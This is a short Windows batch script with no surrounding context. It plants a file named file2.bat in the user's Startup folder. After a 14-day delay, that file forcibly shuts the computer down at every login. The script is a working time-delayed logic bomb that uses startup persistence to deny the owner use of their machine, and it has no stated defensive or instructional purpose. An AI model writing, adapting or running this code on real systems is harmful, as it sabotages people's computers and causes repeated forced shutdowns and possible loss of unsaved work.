@echo off

for /f %%A in ('powershell -command "& {(Get-Date).AddDays(14).ToString('yyyy-MM-dd')}"') do set "NewDate=%%A"

set "startupPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"


(
echo @echo off
echo for /f %%%%A in ^('powershell -command "& ^{(Get-Date).ToString('yyyy-MM-dd')^}"'^) do set "TODAY=%%%%A"
echo set "EXPIRATION_DATE=%NewDate%"
echo powershell -command "& {if ((Get-Date).ToString('yyyy-MM-dd') -ge '%NewDate%') { Stop-Computer -Force }}"
) > "%startupPath%\file2.bat"
